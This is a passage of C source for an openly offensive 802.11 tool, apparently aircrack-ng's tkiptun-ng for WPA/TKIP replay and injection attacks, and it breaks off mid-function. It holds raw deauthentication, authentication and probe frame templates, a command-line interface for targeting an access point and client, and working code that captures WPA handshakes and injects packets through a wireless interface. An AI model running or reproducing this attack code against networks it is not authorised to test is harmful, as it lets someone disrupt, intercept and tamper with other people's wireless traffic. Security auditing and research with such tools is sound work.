/*
 *  802.11 WPA replay & injection attacks
 *
 *  Copyright (C) 2008, 2009 Martin Beck <hirte@aircrack-ng.org>
 *
 *  WEP decryption attack (chopchop) developed by KoreK
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#if defined(linux)
    #include <linux/rtc.h>
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>

#include <fcntl.h>
#include <ctype.h>

#include <limits.h>

#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "version.h"
#include "pcap.h"
#include "osdep/osdep.h"
#include "crypto.h"
#include "common.h"
#include "eapol.h"

#define RTC_RESOLUTION  8192

#define REQUESTS    30
#define MAX_APS     20

#define NEW_IV  1
#define RETRY   2
#define ABORT   3

#define DEAUTH_REQ      \
    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ        \
    "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ       \
    "\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define NULL_DATA       \
    "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RTS             \
    "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"

#define RATES           \
    "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

#define PROBE_REQ       \
    "\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"  \
    "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define RATE_NUM 12

#define RATE_1M 1000000
#define RATE_2M 2000000
#define RATE_5_5M 5500000
#define RATE_11M 11000000

#define RATE_6M 6000000
#define RATE_9M 9000000
#define RATE_12M 12000000
#define RATE_18M 18000000
#define RATE_24M 24000000
#define RATE_36M 36000000
#define RATE_48M 48000000
#define RATE_54M 54000000

#define DEFAULT_MIC_FAILURE_INTERVAL 60

static unsigned char ZERO[32] =
        "\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00";

int bitrates[RATE_NUM]={RATE_1M, RATE_2M, RATE_5_5M, RATE_6M, RATE_9M, RATE_11M, RATE_12M, RATE_18M, RATE_24M, RATE_36M, RATE_48M, RATE_54M};

extern int maccmp(unsigned char *mac1, unsigned char *mac2);
extern unsigned char * getmac(char * macAddress, int strict, unsigned char * mac);
extern int check_crc_buf( unsigned char *buf, int len );
extern const unsigned long int crc_tbl[256];
extern const unsigned char crc_chop_tbl[256][4];
extern int hexStringToArray(char* in, int in_length, unsigned char* out, int out_length);

char usage[] =

"\n"
"  %s - (C) 2008-2015 Thomas d\'Otreppe\n"
"  https://www.aircrack-ng.org\n"
"\n"
"  usage: tkiptun-ng <options> <replay interface>\n"
"\n"
"  Filter options:\n"
"\n"
"      -d dmac   : MAC address, Destination\n"
"      -s smac   : MAC address, Source\n"
"      -m len    : minimum packet length (default: 80) \n"
"      -n len    : maximum packet length (default: 80)\n"
"      -t tods   : frame control, To      DS bit\n"
"      -f fromds : frame control, From    DS bit\n"
"      -D        : disable AP detection\n"
"      -Z        : select packets manually\n"
"\n"
"  Replay options:\n"
"\n"
"      -x nbpps  : number of packets per second\n"
"      -a bssid  : set Access Point MAC address\n"
"      -c dmac   : set Destination  MAC address\n"
"      -h smac   : set Source       MAC address\n"
"      -e essid  : set target AP SSID\n"
"      -M sec    : MIC error timeout in seconds [60]\n"
"\n"
"  Debug options:\n"
"\n"
"      -K prga   : keystream for continuation\n"
"      -y file   : keystream-file for continuation\n"
"      -j        : inject FromDS packets\n"
"      -P pmk    : pmk for verification/vuln testing\n"
"      -p psk    : psk to calculate pmk with essid\n"
"\n"
"  source options:\n"
"\n"
"      -i iface  : capture packets from this interface\n"
"      -r file   : extract packets from this pcap file\n"
"\n"
"      --help    : Displays this usage screen\n"
"\n";

struct options
{
    unsigned char f_bssid[6];
    unsigned char f_dmac[6];
    unsigned char f_smac[6];
    int f_minlen;
    int f_maxlen;
    int f_minlen_set;
    int f_maxlen_set;
    int f_type;
    int f_subtype;
    int f_tods;
    int f_fromds;
    int f_iswep;

    FILE *f_ivs;            /* output ivs file      */

    int r_nbpps;
    int r_fctrl;
    unsigned char r_bssid[6];
    unsigned char r_dmac[6];
    unsigned char r_smac[6];
    unsigned char r_apmac[6];
    unsigned char r_dip[4];
    unsigned char r_sip[4];
    char r_essid[33];
    int r_fromdsinj;
    char r_smac_set;

    char ip_out[16];    //16 for 15 chars + \x00
    char ip_in[16];
    int port_out;
    int port_in;

    char *iface_out;
    char *s_face;
    char *s_file;
    unsigned char *prga;

    int a_mode;
    int a_count;
    int a_delay;

    int ringbuffer;
    int ghost;
    int prgalen;

    int delay;
    int npackets;

    int fast;
    int bittest;

    int nodetect;

    unsigned char oldkeystream[2048];   /* user-defined old keystream */
    int oldkeystreamlen;    /* user-defined old keystream length */
    char  wpa_essid[256];   /* essid used for calculating the pmk out of the psk */
    char  psk[128];         /* shared passphrase among the clients */
    unsigned char pmk[128];         /* pmk derived from the essid and psk */
    unsigned char ptk[80];          /* ptk calculated from all pieces captured in the handshake */
    unsigned char ip_cli[4];
    unsigned char ip_ap[4];
    int got_ptk;
    int got_pmk;
    int got_psk;
    int got_mic_fromds;
    int got_mic_tods;
    int got_ip_ap;
    int got_ip_client;

    struct WPA_hdsk wpa;    /* valid WPA handshake data     */
    struct WPA_ST_info wpa_sta; /* used to calculate the pmk */
    time_t wpa_time;           /* time when the wpa handshake arrived */

    unsigned char *chopped_from_plain;    /* chopped plaintext packet from the AP */
    unsigned char *chopped_to_plain;      /* chopped plaintext packet to the AP */
    unsigned char *chopped_from_prga;    /* chopped keystream from the AP */
    unsigned char *chopped_to_prga;      /* chopped keystream to the AP */
    int chopped_from_plain_len;
    int chopped_to_plain_len;
    int chopped_from_prga_len;
    int chopped_to_prga_len;

    struct timeval last_mic_failure;    /* timestamp of last mic failure */
    int mic_failure_interval;           /* time between allowed mic failures */
}
opt;

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

    unsigned char mac_in[6];
    unsigned char mac_out[6];

    int is_wlanng;
    int is_hostap;
    int is_madwifi;
    int is_madwifing;
    int is_bcm43xx;

    FILE *f_cap_in;

    struct pcap_file_header pfh_in;
}
dev;

static struct wif *_wi_in, *_wi_out;

struct ARP_req
{
    unsigned char *buf;
    int hdrlen;
    int len;
};

struct APt
{
    unsigned char set;
    unsigned char found;
    unsigned char len;
    unsigned char essid[255];
    unsigned char bssid[6];
    unsigned char chan;
    unsigned int  ping[REQUESTS];
    int  pwr[REQUESTS];
};

struct APt ap[MAX_APS];

unsigned long nb_pkt_sent;
unsigned char h80211[4096];
unsigned char tmpbuf[4096];
unsigned char srcbuf[4096];
char strbuf[512];

unsigned char ska_auth1[]     = "\xb0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xb0\x01\x01\x00\x01\x00\x00\x00";

unsigned char ska_auth3[4096] = "\xb0\x40\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                        "\x00\x00\x00\x00\x00\x00\xc0\x01";


int ctrl_c, alarmed;

char * iwpriv;


void sighandler( int signum )
{
    if( signum == SIGINT )
        ctrl_c++;

    if( signum == SIGALRM )
        alarmed++;
}

int reset_ifaces()
{
    //close interfaces
    if(_wi_in != _wi_out)
    {
        if(_wi_in)
        {
            wi_close(_wi_in);
            _wi_in = NULL;
        }
        if(_wi_out)
        {
            wi_close(_wi_out);
            _wi_out = NULL;
        }
    }
    else
    {
        if(_wi_out)
        {
            wi_close(_wi_out);
            _wi_out = NULL;
            _wi_in = NULL;
        }
    }

    /* open the replay interface */
    _wi_out = wi_open(opt.iface_out);
    if (!_wi_out)
        return 1;
    dev.fd_out = wi_fd(_wi_out);

    /* open the packet source */
    if( opt.s_face != NULL )
    {
        _wi_in = wi_open(opt.s_face);
        if (!_wi_in)
            return 1;
        dev.fd_in = wi_fd(_wi_in);
        wi_get_mac(_wi_in, dev.mac_in);
    }
    else
    {
        _wi_in = _wi_out;
        dev.fd_in = dev.fd_out;

        /* XXX */
        dev.arptype_in = dev.arptype_out;
        wi_get_mac(_wi_in, dev.mac_in);
    }

    wi_get_mac(_wi_out, dev.mac_out);

    return 0;
}

int set_bitrate(struct wif *wi, int rate)
{
    int i, newrate;

    if( wi_set_rate(wi, rate) )
        return 1;

//    if( reset_ifaces() )
//        return 1;

    //Workaround for buggy drivers (rt73) that do not accept 5.5M, but 5M instead
    if (rate == 5500000 && wi_get_rate(wi) != 5500000) {
	if( wi_set_rate(wi, 5000000) )
	    return 1;
    }

    newrate = wi_get_rate(wi);
    for(i=0; i<RATE_NUM; i++)
    {
        if(bitrates[i] == rate)
            break;
    }
    if(i==RATE_NUM)
        i=-1;
    if( newrate != rate )
    {
        if(i!=-1)
        {
            if( i>0 )
            {
                if(bitrates[i-1] >= newrate)
                {
                    printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
                    return 1;
                }
            }
            if( i<RATE_NUM-1 )
            {
                if(bitrates[i+1] <= newrate)
                {
                    printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
                    return 1;
                }
            }
            return 0;
        }
        printf("Couldn't set rate to %.1fMBit. (%.1fMBit instead)\n", (rate/1000000.0), (wi_get_rate(wi)/1000000.0));
        return 1;
    }
    return 0;
}

int check_received(unsigned char *packet, unsigned length)
{
    unsigned z;
    unsigned char bssid[6], smac[6], dmac[6];
    struct ivs2_pkthdr ivs2;

    z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;

    if(length < z) return 0;

    /* Check if 802.11e (QoS) */
    if( (packet[0] & 0x80) == 0x80) z+=2;

    switch( packet[1] & 3 )
    {
        case  0:
            memcpy( bssid, packet + 16, 6 );
            memcpy( dmac, packet + 4, 6 );
            memcpy( smac, packet + 10, 6 );
            break;
        case  1:
            memcpy( bssid, packet + 4, 6 );
            memcpy( dmac, packet + 16, 6 );
            memcpy( smac, packet + 10, 6 );
            break;
        case  2:
            memcpy( bssid, packet + 10, 6 );
            memcpy( dmac, packet + 4, 6 );
            memcpy( smac, packet + 16, 6 );
            break;
        default:
            memcpy( bssid, packet + 10, 6 );
            memcpy( dmac, packet + 16, 6 );
            memcpy( smac, packet + 24, 6 );
            break;
    }

    if( memcmp(bssid, opt.f_bssid, 6) != 0 )
    {
        return(0);
    }
    else
    {
        if(memcmp(dmac, opt.wpa.stmac, 6) != 0 && memcmp(smac, opt.wpa.stmac, 6) != 0)
            return(0);
    }

    if( z + 26 > length )
        return 0;

    if(!(packet[1] & 0x40)) //not encrypted
    {
        z += 6;     //skip LLC header

        /* check ethertype == EAPOL */
        if( packet[z] == 0x88 && packet[z + 1] == 0x8E && (packet[1] & 0x40) != 0x40 )
        {
            if(opt.wpa.state != 7 || time(NULL) - opt.wpa_time > 1)
            {
                z += 2;     //skip ethertype

                /* frame 1: Pairwise == 1, Install == 0, Ack == 1, MIC == 0 */

                if( ( packet[z + 6] & 0x08 ) != 0 &&
                        ( packet[z + 6] & 0x40 ) == 0 &&
                        ( packet[z + 6] & 0x80 ) != 0 &&
                        ( packet[z + 5] & 0x01 ) == 0 )
                {
                    memcpy( opt.wpa.anonce, &packet[z + 17], 32 );
                    opt.wpa.state = 1;
                }


                /* frame 2 or 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1 */

                if( z+17+32 > length )
                    return 0;

                if( ( packet[z + 6] & 0x08 ) != 0 &&
                        ( packet[z + 6] & 0x40 ) == 0 &&
                        ( packet[z + 6] & 0x80 ) == 0 &&
                        ( packet[z + 5] & 0x01 ) != 0 )
                {
                    if( memcmp( &packet[z + 17], ZERO, 32 ) != 0 )
                    {
                        memcpy( opt.wpa.snonce, &packet[z + 17], 32 );
                        opt.wpa.state |= 2;

                    }

                    if( (opt.wpa.state & 4) != 4 )
                    {
                        opt.wpa.eapol_size = ( packet[z + 2] << 8 )
                                +   packet[z + 3] + 4;

                        if (opt.wpa.eapol_size > sizeof(opt.wpa.eapol) ||
                            length - z < opt.wpa.eapol_size) {
                            // ignore packet trying to crash us
                            opt.wpa.eapol_size = 0;
                            return 0;
                        }

                        memcpy( opt.wpa.keymic, &packet[z + 81], 16 );
                        memcpy( opt.wpa.eapol,  &packet[z], opt.wpa.eapol_size );
                        memset( opt.wpa.eapol + 81, 0, 16 );
                        opt.wpa.state |= 4;
                        opt.wpa.keyver = packet[z + 6] & 7;
                    }
                }

                /* frame 3: Pairwise == 1, Install == 1, Ack == 1, MIC == 1 */

                if( ( packet[z + 6] & 0x08 ) != 0 &&
                        ( packet[z + 6] & 0x40 ) != 0 &&
                        ( packet[z + 6] & 0x80 ) != 0 &&
                        ( packet[z + 5] & 0x01 ) != 0 )
                {
                    if( memcmp( &packet[z + 17], ZERO, 32 ) != 0 )
                    {
                        memcpy( opt.wpa.anonce, &packet[z + 17], 32 );
                        opt.wpa.state |= 1;
                    }

                    if( (opt.wpa.state & 4) != 4 )
                    {
                        opt.wpa.eapol_size = ( packet[z + 2] << 8 )
                                +   packet[z + 3] + 4;

                        if (opt.wpa.eapol_size > sizeof(opt.wpa.eapol) ||
                            length - z < opt.wpa.eapol_size) {
                            // ignore packet trying to crash us
                            opt.wpa.eapol_size = 0;
                            return 0;
                        }

                        memcpy( opt.wpa.keymic, &packet[z + 81], 16 );
                        memcpy( opt.wpa.eapol,  &packet[z], opt.wpa.eapol_size );
                        memset( opt.wpa.eapol + 81, 0, 16 );
                        opt.wpa.state |= 4;
                        opt.wpa.keyver = packet[z + 6] & 7;
                    }
                }

                if( opt.wpa.state == 7)
                {
                    memcpy( opt.wpa.stmac, opt.r_smac, 6 );
                    PCT; printf("WPA handshake: %02X:%02X:%02X:%02X:%02X:%02X captured\n",
                        opt.r_bssid[0], opt.r_bssid[1], opt.r_bssid[2],
                        opt.r_bssid[3], opt.r_bssid[4], opt.r_bssid[5]);

                    opt.wpa_time = time(NULL);

                    if( opt.f_ivs != NULL )
                    {
                        memset(&ivs2, '\x00', sizeof(struct ivs2_pkthdr));
                        ivs2.flags = 0;
                        ivs2.len = 0;

                        ivs2.len= sizeof(struct WPA_hdsk);
                        ivs2.flags |= IVS2_WPA;

                        ivs2.flags |= IVS2_BSSID;
                        ivs2.len += 6;

                        if( fwrite( &ivs2, 1, sizeof(struct ivs2_pkthdr), opt.f_ivs )
                            != (size_t) sizeof(struct ivs2_pkthdr) )
                        {
                            perror( "fwrite(IV header) failed" );
                            return( 1 );
                        }

                        if( ivs2.flags & IVS2_BSSID )
                        {
                            if( fwrite( opt.r_bssid, 1, 6, opt.f_ivs ) != (size_t) 6 )
                            {
                                perror( "fwrite(IV bssid) failed" );
                                return( 1 );
                            }
                            ivs2.len -= 6;
                        }

                        if( fwrite( &(opt.wpa), 1, sizeof(struct WPA_hdsk), opt.f_ivs ) != (size_t) sizeof(struct WPA_hdsk) )
                        {
                            perror( "fwrite(IV wpa_hdsk) failed" );
                            return( 1 );
                        }
                    }
                }
            }
        }
    }

    return 0;
}

int send_packet(void *buf, size_t count)
{
	struct wif *wi = _wi_out; /* XXX globals suck */
// 	unsigned char *pkt = (unsigned char*) buf;

// 	if( (count > 24) && (pkt[1] & 0x04) == 0 && (pkt[22] & 0x0F) == 0)
// 	{
// 		pkt[22] += (nb_pkt_sent & 0x0000000F) << 4;
// 		pkt[23] += (nb_pkt_sent & 0x00000FF0) >> 4;
// 	}

	if (wi_write(wi, buf, count, NULL) == -1) {
		switch (errno) {
		case EAGAIN:
		case ENOBUFS:
			usleep(10000);
			return 0; /* XXX not sure I like this... -sorbo */
		}

		perror("wi_write()");
		return -1;
	}

	nb_pkt_sent++;
	return 0;
}

int read_packet(void *buf, size_t count, struct rx_info *ri)
{
    struct wif *wi = _wi_in; /* XXX */
    int rc;

    rc = wi_read(wi, buf, count, ri);
    if (rc == -1) {
        switch (errno) {
        case EAGAIN:
                return 0;
        }

        perror("wi_read()");
        return -1;
    }

    return rc;
}

void read_sleep( unsigned long usec )
{
    struct timeval tv, tv2, tv3;
    int caplen;
    fd_set rfds;

    gettimeofday(&tv, NULL);
    gettimeofday(&tv2, NULL);

    tv3.tv_sec=0;
    tv3.tv_usec=10000;

    while( ((tv2.tv_sec*1000000UL - tv.tv_sec*1000000UL) + (tv2.tv_usec - tv.tv_usec)) < (usec) )
    {
        FD_ZERO( &rfds );
        FD_SET( dev.fd_in, &rfds );

        if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv3 ) < 0 )
        {
            continue;
        }

        if( FD_ISSET( dev.fd_in, &rfds ) )
        {
            caplen = read_packet( h80211, sizeof( h80211 ), NULL );
            check_received(h80211, caplen);
        }

        usleep(1000);
        gettimeofday(&tv2, NULL);
    }
}

int filter_packet( unsigned char *h80211, int caplen )
{
    int z, mi_b, mi_s, mi_d, ext=0, qos=0;

    if(caplen <= 0)
        return( 1 );

    z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
    if ( ( h80211[0] & 0x80 ) == 0x80 )
    {
        qos = 1; /* 802.11e QoS */
        z+=2;
    }

    if(!qos) return(1);

    if( (h80211[0] & 0x0C) == 0x08)    //if data packet
        ext = z-24; //how many bytes longer than default ieee80211 header

    /* check length */
    if( caplen-ext < opt.f_minlen ||
        caplen-ext > opt.f_maxlen ) return( 1 );

    /* check the frame control bytes */

    if( ( h80211[0] & 0x80 ) != 0x80 )
        return( 1 );    //no QoS packet

    if( ( h80211[0] & 0x0C ) != ( opt.f_type    << 2 ) &&
        opt.f_type    >= 0 ) return( 1 );

    if( ( h80211[0] & 0x70 ) != (( opt.f_subtype << 4 ) & 0x70) && //ignore the leading bit (QoS)
        opt.f_subtype >= 0 ) return( 1 );

    if( ( h80211[1] & 0x01 ) != ( opt.f_tods         ) &&
        opt.f_tods    >= 0 ) return( 1 );

    if( ( h80211[1] & 0x02 ) != ( opt.f_fromds  << 1 ) &&
        opt.f_fromds  >= 0 ) return( 1 );

    if( ( h80211[1] & 0x40 ) != ( opt.f_iswep   << 6 ) &&
        opt.f_iswep   >= 0 ) return( 1 );

    /* check the extended IV (TKIP) flag */

//     if( opt.f_type == 2 && opt.f_iswep == 1 &&
//         ( h80211[z + 3] & 0x20 ) != 0 ) return( 1 );

    /* MAC address checking */

    switch( h80211[1] & 3 )
    {
        case  0: mi_b = 16; mi_s = 10; mi_d =  4; break;
        case  1: mi_b =  4; mi_s = 10; mi_d = 16; break;
        case  2: mi_b = 10; mi_s = 16; mi_d =  4; break;
        default: mi_b = 10; mi_d = 16; mi_s = 24; break;
    }

    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) != 0 )
        if( memcmp( h80211 + mi_b, opt.f_bssid, 6 ) != 0 )
            return( 1 );

    if( memcmp( opt.f_bssid, opt.f_smac, 6) == 0)
    {
        if( memcmp( opt.f_smac,  NULL_MAC, 6 ) != 0 )
            if( memcmp( h80211 + mi_s,  opt.f_smac,  5 ) != 0 )
                return( 1 );
    }
    else
    {
        if( memcmp( opt.f_smac,  NULL_MAC, 6 ) != 0 )
            if( memcmp( h80211 + mi_s,  opt.f_smac,  6 ) != 0 )
                return( 1 );
    }

    if( memcmp( opt.f_bssid, opt.f_dmac, 6) == 0)
    {
        if( memcmp( opt.f_dmac,  NULL_MAC, 6 ) != 0 )
            if( memcmp( h80211 + mi_d,  opt.f_dmac,  5 ) != 0 )
                return( 1 );
    }
    else
    {
        if( memcmp( opt.f_dmac,  NULL_MAC, 6 ) != 0 )
            if( memcmp( h80211 + mi_d,  opt.f_dmac,  6 ) != 0 )
                return( 1 );
    }

    /* this one looks good */

    return( 0 );
}

int wait_for_beacon(unsigned char *bssid, unsigned char *capa, char *essid)
{
    int len = 0, chan = 0, taglen = 0, tagtype = 0, pos = 0;
    unsigned char pkt_sniff[4096];
    struct timeval tv,tv2;
    char essid2[33];

    gettimeofday(&tv, NULL);
    while (1)
    {
        len = 0;
        while (len < 22)
        {
            len = read_packet(pkt_sniff, sizeof(pkt_sniff), NULL);

            gettimeofday(&tv2, NULL);
            if(((tv2.tv_sec-tv.tv_sec)*1000000UL) + (tv2.tv_usec-tv.tv_usec) > 10000*1000) //wait 10sec for beacon frame
            {
                return -1;
            }
            if(len <= 0) usleep(1000);
        }
        if (! memcmp(pkt_sniff, "\x80", 1))
        {
            pos = 0;
            taglen = 22;    //initial value to get the fixed tags parsing started
            taglen+= 12;    //skip fixed tags in frames
            do
            {
                pos    += taglen + 2;
                tagtype = pkt_sniff[pos];
                taglen  = pkt_sniff[pos+1];
            } while(tagtype != 3 && pos < len-2);

            if(tagtype != 3) continue;
            if(taglen != 1) continue;
            if(pos+2+taglen > len) continue;

            chan = pkt_sniff[pos+2];

            if(essid)
            {
                pos = 0;
                taglen = 22;    //initial value to get the fixed tags parsing started
                taglen+= 12;    //skip fixed tags in frames
                do
                {
                    pos    += taglen + 2;
                    tagtype = pkt_sniff[pos];
                    taglen  = pkt_sniff[pos+1];
                } while(tagtype != 0 && pos < len-2);

                if(tagtype != 0) continue;
                if(taglen <= 1)
                {
                    if (memcmp(bssid, pkt_sniff+10, 6) == 0) break;
                    else continue;
                }
                if(pos+2+taglen > len) continue;

                if(taglen > 32)taglen = 32;

                if((pkt_sniff+pos+2)[0] < 32 && memcmp(bssid, pkt_sniff+10, 6) == 0)
                {
                    break;
                }

                /* if bssid is given, copy essid */
                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) == 0)
                {
                    memset(essid, 0, 33);
                    memcpy(essid, pkt_sniff+pos+2, taglen);
                    break;
                }

                /* if essid is given, copy bssid AND essid, so we can handle case insensitive arguments */
                if(bssid != NULL && memcmp(bssid, NULL_MAC, 6) == 0 && strncasecmp(essid, (char*)pkt_sniff+pos+2, taglen) == 0 && strlen(essid) == (unsigned)taglen)
                {
                    memset(essid, 0, 33);
                    memcpy(essid, pkt_sniff+pos+2, taglen);
                    memcpy(bssid, pkt_sniff+10, 6);
                    printf("Found BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\" to given ESSID \"%s\".\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], essid);
                    break;
                }

                /* if essid and bssid are given, check both */
                if(bssid != NULL && memcmp(bssid, pkt_sniff+10, 6) == 0 && strlen(essid) > 0)
                {
                    memset(essid2, 0, 33);
                    memcpy(essid2, pkt_sniff+pos+2, taglen);
                    if(strncasecmp(essid, essid2, taglen) == 0 && strlen(essid) == (unsigned)taglen)
                        break;
                    else
                    {
                        printf("For the given BSSID \"%02X:%02X:%02X:%02X:%02X:%02X\", there is an ESSID mismatch!\n", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                        printf("Found ESSID \"%s\" vs. specified ESSID \"%s\"\n", essid2, essid);
                        printf("Using the given one, double check it to be sure its correct!\n");
                        break;
                    }
                }
            }
        }
    }

    if(capa) memcpy(capa, pkt_sniff+34, 2);

    return chan;
}

/*
    if bssid != NULL its looking for a beacon frame
*/
int attack_check(unsigned char* bssid, char* essid, unsigned char* capa, struct wif *wi)
{
    int ap_chan=0, iface_chan=0;

    iface_chan = wi_get_channel(wi);

    if(bssid != NULL)
    {
        ap_chan = wait_for_beacon(bssid, capa, essid);
        if(ap_chan < 0)
        {
            PCT; printf("No such BSSID available.\n");
            return -1;
        }
        if(ap_chan != iface_chan)
        {
            PCT; printf("%s is on channel %d, but the AP uses channel %d\n", wi_get_ifname(wi), iface_chan, ap_chan);
            return -1;
        }
    }

    return 0;
}

int getnet( unsigned char* capa, int filter, int force)
{
    unsigned char *bssid;

    if(opt.nodetect)
        return 0;

    if(filter)
        bssid = opt.f_bssid;
    else
        bssid = opt.r_bssid;


    if( memcmp(bssid, NULL_MAC, 6) )
    {
        PCT; printf("Waiting for beacon frame (BSSID: %02X:%02X:%02X:%02X:%02X:%02X) on channel %d\n",
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],wi_get_channel(_wi_in));
    }
    else if(strlen(opt.r_essid) > 0)
    {
        PCT; printf("Waiting for beacon frame (ESSID: %s) on channel %d\n", opt.r_essid,wi_get_channel(_wi_in));
    }
    else if(force)
    {
        PCT;
        if(filter)
        {
            printf("Please specify at least a BSSID (-b) or an ESSID (-e)\n");
        }
        else
        {
            printf("Please specify at least a BSSID (-a) or an ESSID (-e)\n");
        }
        return( 1 );
    }
    else
        return 0;

    if( attack_check(bssid, opt.r_essid, capa, _wi_in) != 0)
    {
        if(memcmp(bssid, NULL_MAC, 6))
        {
            if( strlen(opt.r_essid) == 0 || opt.r_essid[0] < 32)
            {
                printf( "Please specify an ESSID (-e).\n" );
            }
        }

        if(!memcmp(bssid, NULL_MAC, 6))
        {
            if(strlen(opt.r_essid) > 0)
            {
                printf( "Please specify a BSSID (-a).\n" );
            }
        }
        return( 1 );
    }

    return 0;
}

int xor_keystream(unsigned char *ph80211, unsigned char *keystream, int len)
{
    int i=0;

    for (i=0; i<len; i++) {
        ph80211[i] = ph80211[i] ^ keystream[i];
    }

    return 0;
}

int capture_ask_packet( int *caplen, int just_grab )
{
    time_t tr;
    struct timeval tv;
    struct tm *lt;

    fd_set rfds;
    long nb_pkt_read;
    int i, j, n, mi_b=0, mi_s=0, mi_d=0, mi_t=0, mi_r=0, is_wds=0, key_index_offset;
    int ret, z;

    FILE *f_cap_out;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;

    if( opt.f_minlen  < 0 ) opt.f_minlen  =   40;
    if( opt.f_maxlen  < 0 ) opt.f_maxlen  = 1500;
    if( opt.f_type    < 0 ) opt.f_type    =    2;
    if( opt.f_subtype < 0 ) opt.f_subtype =    0;
    if( opt.f_iswep   < 0 ) opt.f_iswep   =    1;

    tr = time( NULL );

    nb_pkt_read = 0;

    signal( SIGINT, SIG_DFL );

    while( 1 )
    {
        if( time( NULL ) - tr > 0 )
        {
            tr = time( NULL );
            printf( "\rRead %ld packets...\r", nb_pkt_read );
            fflush( stdout );
        }

        if( opt.s_file == NULL )
        {
            FD_ZERO( &rfds );
            FD_SET( dev.fd_in, &rfds );

            tv.tv_sec  = 1;
            tv.tv_usec = 0;

            if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
            {
                if( errno == EINTR ) continue;
                perror( "select failed" );
                return( 1 );
            }

            if( ! FD_ISSET( dev.fd_in, &rfds ) )
                continue;

            gettimeofday( &tv, NULL );

            *caplen = read_packet( h80211, sizeof( h80211 ), NULL );

            if( *caplen  < 0 ) return( 1 );
            if( *caplen == 0 ) continue;
        }
        else
        {
            /* there are no hidden backdoors in this source code */

            n = sizeof( pkh );

            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )
            {
                printf( "\r\33[KEnd of file.\n" );
                return( 1 );
            }

            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
                SWAP32( pkh.caplen );
                SWAP32( pkh.len );
            }

            tv.tv_sec  = pkh.tv_sec;
            tv.tv_usec = pkh.tv_usec;

            n = *caplen = pkh.caplen;

            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )
            {
                printf( "\r\33[KInvalid packet length %d.\n", n );
                return( 1 );
            }

            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )
            {
                printf( "\r\33[KEnd of file.\n" );
                return( 1 );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
            {
                if( h80211[7] == 0x40 )
                    n = 64;
                else
                    n = *(int *)( h80211 + 4 );

